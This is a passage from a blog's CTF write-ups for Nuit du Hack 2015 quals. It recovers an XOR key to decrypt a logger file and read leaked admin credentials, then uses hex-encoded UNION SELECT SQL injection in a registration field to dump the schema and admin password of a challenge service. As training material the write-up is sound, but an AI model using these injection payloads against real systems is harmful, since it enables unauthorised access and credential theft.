<span class="code-line"><span class="mi">00000100</span><span class="w">  </span><span class="mi">43</span><span class="w"> </span><span class="mi">4</span><span class="n">e</span><span class="w"> </span><span class="mi">6</span><span class="n">c</span><span class="w"> </span><span class="mi">5</span><span class="n">d</span><span class="w"> </span><span class="mi">4</span><span class="n">d</span><span class="w"> </span><span class="mi">77</span><span class="w"> </span><span class="mi">2</span><span class="n">e</span><span class="w"> </span><span class="mi">61</span><span class="w">  </span><span class="mi">06</span><span class="w"> </span><span class="mi">66</span><span class="w"> </span><span class="mi">5</span><span class="n">b</span><span class="w"> </span><span class="mi">56</span><span class="w"> </span><span class="mi">4</span><span class="n">e</span><span class="w"> </span><span class="mi">31</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">37</span><span class="w">  </span><span class="o">|</span><span class="n">CNl</span><span class="err">]</span><span class="n">Mw</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">f</span><span class="err">[</span><span class="n">VN1</span><span class="p">(</span><span class="mi">7</span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="mi">00000110</span><span class="w">  </span><span class="mi">43</span><span class="w"> </span><span class="mi">61</span><span class="w"> </span><span class="mi">75</span><span class="w"> </span><span class="mi">15</span><span class="w"> </span><span class="mi">1</span><span class="n">f</span><span class="w"> </span><span class="mi">36</span><span class="w"> </span><span class="mi">2</span><span class="n">e</span><span class="w"> </span><span class="mi">6</span><span class="n">c</span><span class="w">  </span><span class="mi">06</span><span class="w"> </span><span class="mi">4</span><span class="n">e</span><span class="w"> </span><span class="mi">47</span><span class="w"> </span><span class="mi">59</span><span class="w"> </span><span class="mi">0</span><span class="n">a</span><span class="w"> </span><span class="mi">75</span><span class="w"> </span><span class="mi">7</span><span class="n">c</span><span class="w"> </span><span class="mi">7</span><span class="n">a</span><span class="w">  </span><span class="o">|</span><span class="n">Cau</span><span class="p">.</span><span class="mf">.6</span><span class="p">.</span><span class="n">l</span><span class="p">.</span><span class="n">NGY</span><span class="p">.</span><span class="n">u</span><span class="o">|</span><span class="n">z</span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="mi">00000120</span><span class="w">  </span><span class="mi">44</span><span class="w"> </span><span class="mi">7</span><span class="n">c</span><span class="w"> </span><span class="mi">6</span><span class="n">a</span><span class="w"> </span><span class="mi">58</span><span class="w"> </span><span class="mi">55</span><span class="w"> </span><span class="mi">33</span><span class="w"> </span><span class="mi">3</span><span class="n">b</span><span class="w"> </span><span class="mi">7</span><span class="n">d</span><span class="w">  </span><span class="mi">17</span><span class="w"> </span><span class="mi">53</span><span class="w"> </span><span class="mi">43</span><span class="w"> </span><span class="mi">51</span><span class="w"> </span><span class="mi">41</span><span class="w"> </span><span class="mi">3</span><span class="n">f</span><span class="w"> </span><span class="mi">69</span><span class="w"> </span><span class="mi">61</span><span class="w">  </span><span class="o">|</span><span class="n">D</span><span class="o">|</span><span class="n">jXU3</span><span class="p">;</span><span class="err">}</span><span class="p">.</span><span class="n">SCQA</span><span class="vm">?</span><span class="n">ia</span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="mi">00000130</span><span class="w">  </span><span class="mi">45</span><span class="w"> </span><span class="mi">69</span><span class="w"> </span><span class="mi">7</span><span class="n">a</span><span class="w"> </span><span class="mi">1</span><span class="n">d</span><span class="w"> </span><span class="mi">19</span><span class="w"> </span><span class="mi">34</span><span class="w"> </span><span class="mi">63</span><span class="w"> </span><span class="mi">32</span><span class="w">  </span><span class="mi">03</span><span class="w"> </span><span class="mi">53</span><span class="w"> </span><span class="mi">49</span><span class="w"> </span><span class="mi">0</span><span class="n">a</span><span class="w"> </span><span class="mi">1</span><span class="n">f</span><span class="w"> </span><span class="mi">79</span><span class="w"> </span><span class="mi">37</span><span class="w"> </span><span class="mi">25</span><span class="w">  </span><span class="o">|</span><span class="n">Eiz</span><span class="p">.</span><span class="mf">.4</span><span class="n">c2</span><span class="p">.</span><span class="n">SI</span><span class="p">..</span><span class="n">y7</span><span class="o">%|</span><span class="w"></span></span>
<span class="code-line"><span class="mi">00000140</span><span class="w">  </span><span class="mi">1</span><span class="n">c</span><span class="w"> </span><span class="mi">21</span><span class="w"> </span><span class="mi">03</span><span class="w"> </span><span class="mi">5</span><span class="n">e</span><span class="w"> </span><span class="mi">5</span><span class="n">e</span><span class="w"> </span><span class="mi">6</span><span class="n">b</span><span class="w"> </span><span class="mi">21</span><span class="w"> </span><span class="mi">66</span><span class="w">                           </span><span class="o">|</span><span class="p">.</span><span class="err">!</span><span class="p">.</span><span class="o">^^</span><span class="n">k</span><span class="err">!</span><span class="n">f</span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="mi">00000148</span><span class="w"></span></span>
<span class="code-line"></code></pre></div>

<p>XOR being a symmetric algorithm we just need to XOR the first octet of the file
with the word <code>import s</code>:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;&gt;&gt; chr(0x5f^ord(&#39;i&#39;))</span>
<span class="code-line">&#39;6&#39;</span>
<span class="code-line">&gt;&gt;&gt; chr(0x36^ord(&#39;m&#39;))</span>
<span class="code-line">&#39;[&#39;</span>
<span class="code-line">&gt;&gt;&gt; chr(0x30^ord(&#39;p&#39;))</span>
<span class="code-line">&#39;@&#39;</span>
<span class="code-line">&gt;&gt;&gt; chr(0x0b^ord(&#39;o&#39;))</span>
<span class="code-line">&#39;d&#39;</span>
<span class="code-line">&gt;&gt;&gt; chr(0x03^ord(&#39;r&#39;))</span>
<span class="code-line">&#39;q&#39;</span>
<span class="code-line">&gt;&gt;&gt; chr(0x56^ord(&#39;t&#39;))</span>
<span class="code-line">&#39;&quot;&#39;</span>
<span class="code-line">&gt;&gt;&gt; chr(0x06^ord(&#39; &#39;))</span>
<span class="code-line">&#39;&amp;&#39;</span>
<span class="code-line">&gt;&gt;&gt; chr(0x17^ord(&#39;s&#39;))</span>
<span class="code-line">&#39;d&#39;</span>
<span class="code-line"></code></pre></div>

<p>We decipher the file with the key <strong>6[@dq"&amp;d</strong> and obtain the following first
line:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">satetime</span></span>
<span class="code-line"></code></pre></div>

<p>The first line of our file was not <code>import sys</code> but <code>import datetime</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;&gt;&gt; chr(0x17^ord(&#39;d&#39;))</span>
<span class="code-line">&#39;s&#39;</span>
<span class="code-line"></code></pre></div>

<h3 id="the-logs-file">The logs file</h3>
<p>We decipher the file with the key <strong>6[@dq"&amp;s</strong> and obtain the following file:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">datetime</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">LOG_DIR</span> <span class="o">=</span> <span class="s1">&#39;logs&#39;</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">class</span> <span class="nc">Logger</span><span class="p">():</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="nd">@staticmethod</span></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">log</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span></span>
<span class="code-line">        <span class="n">basename</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1">/</span><span class="si">%s</span><span class="s1">_</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">LOG_DIR</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">()),</span> <span class="n">username</span><span class="p">)</span></span>
<span class="code-line">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">basename</span><span class="p">,</span> <span class="s1">&#39;a+&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fd</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;[</span><span class="si">%s</span><span class="s1">] Login with password </span><span class="si">%s</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">today</span><span class="p">()),</span> <span class="n">password</span><span class="p">))</span></span>
<span class="code-line"></code></pre></div>

<p>We see that the logs of the application are in a file like
<code>/logs/date_username/</code> with the date in the format YYYY-MM-DD.</p>
<p>We go to the URL http://updator.challs.nuitduhack.com/logs/2015-04-04_admin to
see the logs:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>[2015-04-04 18:49:48.839448] Login with password Mpt2P4sse2Ouf</span>
<span class="code-line">[2015-04-04 18:49:54.044382] Login with password Mot2P4sse2Ouf</span>
<span class="code-line"></code></pre></div>

<p>We now have the credentials to log ourself in the interface and get the flag.</p>
<p><strong>Flag: zEpbiUFt5p7m84cxOxN6</strong></p>
<h1 id="raptor">Raptor</h1>
<p><strong>Thank to <a href="https://twitter.com/_plo_">Plo</a> who redact this WRITUP before me.</strong></p>
<p>Misc   \   400 points      http://quals.nuitduhack.com/challenges/view/12</p>
<h2 id="statement_4">Statement</h2>
<p>No statement, nothing except a link: raptor.challs.nuitduhack.com:4142</p>
<h2 id="challenge_4">Challenge</h2>
<p>We connect ourself to the port and the address:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">plo@hyperion Misc</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="n">raptor</span><span class="p">.</span><span class="n">challs</span><span class="p">.</span><span class="n">nuitduhack</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="mi">4142</span><span class="w"></span></span>
<span class="code-line"><span class="o">~</span><span class="w"> </span><span class="err">»</span><span class="w"> </span><span class="n">Welcome</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Raptor</span><span class="o">/</span><span class="mf">1.0</span><span class="w"> </span><span class="n">Information</span><span class="w"> </span><span class="n">Exchange</span><span class="w"> </span><span class="n">Server</span><span class="w"></span></span>
<span class="code-line"><span class="o">~</span><span class="w"> </span><span class="err">»</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">anonymous</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">Read</span><span class="w"> </span><span class="k">only</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="err">!</span><span class="w"></span></span>
<span class="code-line"><span class="n">Available</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="err">:</span><span class="w"></span></span>
<span class="code-line"><span class="o">+----------+-----------------+-------------------------------+--------------------------------+</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w"> </span><span class="n">Command</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">Required</span><span class="w"> </span><span class="n">Access</span><span class="w"> </span><span class="o">|</span><span class="w">             </span><span class="n">Syntax</span><span class="w">            </span><span class="o">|</span><span class="w">              </span><span class="n">Help</span><span class="w">              </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">+----------+-----------------+-------------------------------+--------------------------------+</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w">   </span><span class="n">AUTH</span><span class="w">   </span><span class="o">|</span><span class="w">      </span><span class="n">guest</span><span class="w">      </span><span class="o">|</span><span class="w">    </span><span class="n">AUTH</span><span class="w"> </span><span class="o">[</span><span class="n">login</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">password</span><span class="o">]</span><span class="w">    </span><span class="o">|</span><span class="w">     </span><span class="k">Connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">account</span><span class="w">      </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w">   </span><span class="n">LIST</span><span class="w">   </span><span class="o">|</span><span class="w">       </span><span class="k">user</span><span class="w">      </span><span class="o">|</span><span class="w">       </span><span class="n">LIST</span><span class="w"> </span><span class="o">[</span><span class="n">maxrecords</span><span class="o">]</span><span class="w">       </span><span class="o">|</span><span class="w">    </span><span class="n">List</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">informations</span><span class="w">     </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w">  </span><span class="k">SEARCH</span><span class="w">  </span><span class="o">|</span><span class="w">       </span><span class="k">user</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="k">SEARCH</span><span class="w"> </span><span class="o">[</span><span class="n">pattern</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">maxresults</span><span class="o">]</span><span class="w"> </span><span class="o">|</span><span class="w">         </span><span class="k">Search</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="k">user</span><span class="w">         </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w">  </span><span class="n">RSHELL</span><span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="k">admin</span><span class="w">      </span><span class="o">|</span><span class="w">             </span><span class="n">RSHELL</span><span class="w">            </span><span class="o">|</span><span class="w">    </span><span class="n">Migrate</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">Raptor</span><span class="w"> </span><span class="n">Shell</span><span class="w">     </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w"> </span><span class="n">VERSION</span><span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">guest</span><span class="w">      </span><span class="o">|</span><span class="w">            </span><span class="n">VERSION</span><span class="w">            </span><span class="o">|</span><span class="w">  </span><span class="n">Show</span><span class="w"> </span><span class="k">current</span><span class="w"> </span><span class="n">Raptor</span><span class="w"> </span><span class="n">version</span><span class="w">   </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w"> </span><span class="n">REGISTER</span><span class="w"> </span><span class="o">|</span><span class="w">      </span><span class="n">guest</span><span class="w">      </span><span class="o">|</span><span class="w">            </span><span class="n">REGISTER</span><span class="w">           </span><span class="o">|</span><span class="w">     </span><span class="n">Register</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">account</span><span class="w">     </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w">   </span><span class="n">HELP</span><span class="w">   </span><span class="o">|</span><span class="w">      </span><span class="n">guest</span><span class="w">      </span><span class="o">|</span><span class="w">            </span><span class="n">VERSION</span><span class="w">            </span><span class="o">|</span><span class="w">      </span><span class="n">Show</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="n">menu</span><span class="w">       </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w">  </span><span class="n">RIGHTS</span><span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">guest</span><span class="w">      </span><span class="o">|</span><span class="w">             </span><span class="n">RIGHTS</span><span class="w">            </span><span class="o">|</span><span class="w">   </span><span class="k">Print</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="k">current</span><span class="w"> </span><span class="n">rights</span><span class="w">    </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w"> </span><span class="n">HISTORY</span><span class="w">  </span><span class="o">|</span><span class="w">       </span><span class="k">user</span><span class="w">      </span><span class="o">|</span><span class="w">            </span><span class="n">HISTORY</span><span class="w">            </span><span class="o">|</span><span class="w">     </span><span class="n">Show</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="k">call</span><span class="w"> </span><span class="n">history</span><span class="w">     </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w">  </span><span class="n">RESET</span><span class="w">   </span><span class="o">|</span><span class="w">      </span><span class="n">guest</span><span class="w">      </span><span class="o">|</span><span class="w">             </span><span class="n">RESET</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="k">ROLLBACK</span><span class="w"> </span><span class="err">!</span><span class="w"> </span><span class="p">(</span><span class="n">Reset</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">CTF</span><span class="w"> </span><span class="n">DB</span><span class="p">.)</span><span class="w"> </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">|</span><span class="w">   </span><span class="n">QUIT</span><span class="w">   </span><span class="o">|</span><span class="w">      </span><span class="n">guest</span><span class="w">      </span><span class="o">|</span><span class="w">              </span><span class="n">QUIT</span><span class="w">             </span><span class="o">|</span><span class="w">     </span><span class="k">Close</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">connection</span><span class="p">.</span><span class="w">      </span><span class="o">|</span><span class="w"></span></span>
<span class="code-line"><span class="o">+</span><span class="c1">----------+-----------------+-------------------------------+--------------------------------+</span></span>
<span class="code-line"></code></pre></div>

<p>We are connected to the Raptor service as guest.</p>
<p>The output format seems to be a database. A SQL request could return this
output. The Raptor service got 3 level of rights: guest, user and admin and the
only command restricted to the admin right is <code>RSHELL</code>. When continuing to
discover the commands, we notice that the <code>_</code> and <code>%</code> SQL wildcards characters
work directly out of the box:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">guest ~ $ SEARCH %</span></span>
<span class="code-line"><span class="nb">+-----------+---------------+-----------+--------+</span><span class="c"></span></span>
<span class="code-line"><span class="c">| FIRSTNAME |    LASTNAME   | DESKPHONE | RIGHTS |</span></span>
<span class="code-line"><span class="nb">+-----------+---------------+-----------+--------+</span><span class="c"></span></span>
<span class="code-line"><span class="c">|   Wesley  |   Eshmaggle   |    4412   | admin  |</span></span>
<span class="code-line"><span class="c">|    Yvan   |    Delacam    |    0452   |  user  |</span></span>
<span class="code-line"><span class="c">|    Yvon   |     Payrir    |     A     |  user  |</span></span>
<span class="code-line"><span class="c">|   Zlatan  | Ibrahimovitch |    5122   |  user  |</span></span>
<span class="code-line"><span class="nb">+-----------+---------------+-----------+--------+</span><span class="c"></span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c">guest ~ $ SEARCH _</span></span>
<span class="code-line"><span class="nb">+-----------+---------------+-----------+--------+</span><span class="c"></span></span>
<span class="code-line"><span class="c">| FIRSTNAME |    LASTNAME   | DESKPHONE | RIGHTS |</span></span>
<span class="code-line"><span class="nb">+-----------+---------------+-----------+--------+</span><span class="c"></span></span>
<span class="code-line"><span class="c">|   Wesley  |   Eshmaggle   |    4412   | admin  |</span></span>
<span class="code-line"><span class="c">|    Yvan   |    Delacam    |    0452   |  user  |</span></span>
<span class="code-line"><span class="c">|    Yvon   |     Payrir    |     A     |  user  |</span></span>
<span class="code-line"><span class="c">|   Zlatan  | Ibrahimovitch |    5122   |  user  |</span></span>
<span class="code-line"><span class="nb">+-----------+---------------+-----------+--------+</span><span class="c"></span></span>
<span class="code-line"></code></pre></div>

<p>Moreover, the user Yvon Payrir as a DESKPHONE <strong>A</strong>.
We create an account to check if we can put directly a letter as DESKPHONE:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>guest ~ $ REGISTER</span>
<span class="code-line">Please fill the informations below :</span>
<span class="code-line"></span>
<span class="code-line">Login : a</span>
<span class="code-line">Firstname : a</span>
<span class="code-line">Lastname : a</span>
<span class="code-line">Contact (DESK PHONE) : TEST</span>
<span class="code-line">/!\ ERROR ! INVALID DESKPHONE NUMBER !</span>
<span class="code-line"></code></pre></div>

<p>This is not directly possible, we then used the hexadecimal value of TEST:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>guest ~ $ REGISTER</span>
<span class="code-line">Please fill the informations below :</span>
<span class="code-line"></span>
<span class="code-line">Login : a</span>
<span class="code-line">Firstname : a</span>
<span class="code-line">Lastname : a</span>
<span class="code-line">Contact (DESK PHONE) : 0x54455354</span>
<span class="code-line">Password : zenk</span>
<span class="code-line">Encrypting using 128x(ROT13) ......HAAAAAAAAX......</span>
<span class="code-line">Password encryption done ! (Security First) !</span>
<span class="code-line"></span>
<span class="code-line">guest ~ $ SEARCH %</span>
<span class="code-line">+-----------+---------------+-----------+--------+</span>
<span class="code-line">| FIRSTNAME |    LASTNAME   | DESKPHONE | RIGHTS |</span>
<span class="code-line">+-----------+---------------+-----------+--------+</span>
<span class="code-line">|     a     |       a       |    TEST   |  user  |</span>
<span class="code-line">|   Wesley  |   Eshmaggle   |    4412   | admin  |</span>
<span class="code-line">|    Yvan   |    Delacam    |    0452   |  user  |</span>
<span class="code-line">|    Yvon   |     Payrir    |     A     |  user  |</span>
<span class="code-line">|   Zlatan  | Ibrahimovitch |    5122   |  user  |</span>
<span class="code-line">+-----------+---------------+-----------+--------+</span>
<span class="code-line"></code></pre></div>

<p>(We can notice that the password is "Encrypted" with 128 ROT13 which is plain
text as ROT13 is symmetric).
We can inject anything in the DESKPHONE filed.</p>
<p>One of the command is <code>HISTORY</code>. This command list the calls history for a given
user. The coincidence is great as we can inject data in the DESKPHONE field:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>a ~ $ HISTORY</span>
<span class="code-line">RAPTOR CALL REPORTING</span>
<span class="code-line">- CLIENT INFO :</span>
<span class="code-line"></span>
<span class="code-line">+-----------+------+</span>
<span class="code-line">|  USERNAME |  a   |</span>
<span class="code-line">|   RIGHTS  | user |</span>
<span class="code-line">| DESKPHONE | TEST |</span>
<span class="code-line">+-----------+------+</span>
<span class="code-line"></code></pre></div>

<p>If we put an existing number as DESKPHONE, the <code>HISTORY</code> command show us the
history of an other user. It seems to be a simple SQL injection in hexadecimal.
We try to get some informations about the database (the SQL command is in the
DESKPHONE filed):</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>guest ~ $ REGISTER</span>
<span class="code-line">Please fill the informations below :</span>
<span class="code-line"></span>
<span class="code-line">Login : d</span>
<span class="code-line">Firstname : d</span>
<span class="code-line">Lastname : d</span>
<span class="code-line">Contact (DESK PHONE) : 0x3120554e494f4e2053454c454354207461626c655f736368656d612c7461626c655f6e616d652c636f6c756d6e5f6e616d652c6e756c6c2046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73</span>
<span class="code-line">Password : zenk</span>
<span class="code-line">Encrypting using 128x(ROT13) ......HAAAAAAAAX......</span>
<span class="code-line">Password encryption done ! (Security First) !</span>
<span class="code-line"></span>
<span class="code-line">d ~ $ HISTORY</span>
<span class="code-line">RAPTOR CALL REPORTING</span>
<span class="code-line">- CLIENT INFO :</span>
<span class="code-line"></span>
<span class="code-line">+-----------+-----------------------------------------------------------------------------------------+</span>
<span class="code-line">|  USERNAME |                                            d                                            |</span>
<span class="code-line">|   RIGHTS  |                                           user                                          |</span>
<span class="code-line">| DESKPHONE | 1 UNION SELECT table_schema,table_name,column_name,null FROM information_schema.columns |</span>
<span class="code-line">+-----------+-----------------------------------------------------------------------------------------+</span>
<span class="code-line"></span>
<span class="code-line"> - CALL HISTORY</span>
<span class="code-line"></span>
<span class="code-line">+--------------------+---------------------------------------+----------------------------------+----------+</span>
<span class="code-line">|         ID         |                  DATE                 |           DESTINATION            | DURATION |</span>
<span class="code-line">+--------------------+---------------------------------------+----------------------------------+----------+</span>
<span class="code-line">| information_schema |             CHARACTER_SETS            |        CHARACTER_SET_NAME        |   None   |</span>
<span class="code-line">| [...]              |             [...]                     |        [...]                     |   None   |</span>
<span class="code-line">|    x_8816665166    |                 users                 |                id                |   None   |</span>
<span class="code-line">|    x_8816665166    |                 users                 |            firstname             |   None   |</span>
<span class="code-line">|    x_8816665166    |                 users                 |               name               |   None   |</span>
<span class="code-line">|    x_8816665166    |                 users                 |             contact              |   None   |</span>
<span class="code-line">|    x_8816665166    |                 users                 |             password             |   None   |</span>
<span class="code-line">|    x_8816665166    |                 users                 |              login               |   None   |</span>
<span class="code-line">|    x_8816665166    |                 users                 |              rights              |   None   |</span>
<span class="code-line">+--------------------+---------------------------------------+----------------------------------+----------+</span>
<span class="code-line"></code></pre></div>

<p>We get the admin password:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">guest ~ $ REGISTER</span></span>
<span class="code-line"><span class="c">Please fill the informations below :</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c">Login : i</span></span>
<span class="code-line"><span class="c">Firstname : i</span></span>
<span class="code-line"><span class="c">Lastname : i</span></span>
<span class="code-line"><span class="c">Contact (DESK PHONE) : 0x3120554e494f4e2053454c454354206c6f67696e2c70617373776f72642c7269676874732c6e756c6c2046524f4d207573657273205748455245207269676874733d2761646d696e27</span></span>
<span class="code-line"><span class="c">Password : i</span></span>
<span class="code-line"><span class="c">Encrypting using 128x(ROT13) </span><span class="nt">......</span><span class="c">HAAAAAAAAX</span><span class="nt">......</span><span class="c"></span></span>
<span class="code-line"><span class="c">Password encryption done ! (Security First) !</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c">i ~ $ HISTORY</span></span>
<span class="code-line"><span class="c">RAPTOR CALL REPORTING</span></span>
<span class="code-line"><span class="nb">-</span><span class="c"> CLIENT INFO :</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="nb">+-----------+---------------------------------------------------------------------------+</span><span class="c"></span></span>
<span class="code-line"><span class="c">|  USERNAME |                                     i                                     |</span></span>
<span class="code-line"><span class="c">|   RIGHTS  |                                    user                                   |</span></span>
<span class="code-line"><span class="c">| DESKPHONE | 1 UNION SELECT login</span><span class="nt">,</span><span class="c">password</span><span class="nt">,</span><span class="c">rights</span><span class="nt">,</span><span class="c">null FROM users WHERE rights=&#39;admin&#39; |</span></span>
<span class="code-line"><span class="nb">+-----------+---------------------------------------------------------------------------+</span><span class="c"></span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c"> </span><span class="nb">-</span><span class="c"> CALL HISTORY</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="nb">+-------------+------------+-------------+----------+</span><span class="c"></span></span>
<span class="code-line"><span class="c">|      ID     |    DATE    | DESTINATION | DURATION |</span></span>
<span class="code-line"><span class="nb">+-------------+------------+-------------+----------+</span><span class="c"></span></span>
<span class="code-line"><span class="c">| w</span><span class="nt">.</span><span class="c">eshmaggle | Hanlbatard |    admin    |   None   |</span></span>
<span class="code-line"><span class="nb">+-------------+------------+-------------+----------+</span><span class="c"></span></span>
<span class="code-line"></code></pre></div>

<p>We login as the admin user and user the <code>RSHELL</code> command:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>guest ~ $ AUTH w.eshmaggle Hanlbatard</span>
<span class="code-line">Welcome w.eshmaggle !</span>
<span class="code-line">w.eshmaggle ~ $ RSHELL</span>
<span class="code-line">Ok, ok good job. You are admin... The flag is : 0eb80d9c2cdee95b461cf0b70d40791f</span>
<span class="code-line"></code></pre></div>

<p><strong>Flag: 0eb80d9c2cdee95b461cf0b70d40791f</strong></p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2015/04/first-april-sstic-challenge.html"> First April SSTIC challenge </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2015/04/vulnhub-freshly.html"> Vulnhub - Freshly </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/suid.html">SUID</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phishing.html">phishing</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/git.html">git</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/ctf.html">CTF</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/web.html">web</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/gdbserver.html">gdbserver</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/php-filter.html">php filter</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/core-dump.html">core dump</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/splunk.html">Splunk</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/umbraco.html">umbraco</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sqli.html">SQLi</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/msfvenom.html">msfvenom</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pypi.html">pypi</a>
            </li>
